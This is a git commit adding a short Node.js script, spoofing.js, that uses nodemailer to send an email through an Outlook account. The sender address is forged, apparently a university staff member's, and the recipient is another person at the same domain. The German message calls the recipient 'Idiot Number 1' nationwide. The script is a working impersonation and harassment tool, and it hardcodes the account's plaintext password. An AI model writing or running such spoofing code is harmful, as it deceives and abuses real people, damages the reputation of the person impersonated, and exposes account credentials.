1bb834f0f3a5ec4038b5daef34b1a8a3d4bfdb1b
murat114 <alguel1998@hotmail.com>
2022-05-14 23:10:17 +0200

    spoofing

---
+++ spoofing.js
@@ -0,0 +1,28 @@
+var nodemailer = require("nodemailer");
+
+var transporter = nodemailer.createTransport({
+    host: 'smtp-mail.outlook.com',
+    port: 587,
+    secure: false,
+    auth: {
+        user: 'alguel1998@hotmail.com',
+        pass: 'FenerBahce98'
+    }
+});
+
+var mailOptions = {
+  from: 'kaan.eray@mni.thm.de',
+  to:'ufuk.gueler@mni.thm.de',
+  subject: 'Chronische Dummheit',
+    text: 'Glückwunsch sie wurden zum Idioten Nummer 1, Bundesweit, gewählt!'
+};
+
+transporter.sendMail(mailOptions,function(error,info){
+    if (error) {
+        console.log(error);
+    } else {
+        console.log('Email sent: ' + info.response)
+    }
+
+});
+
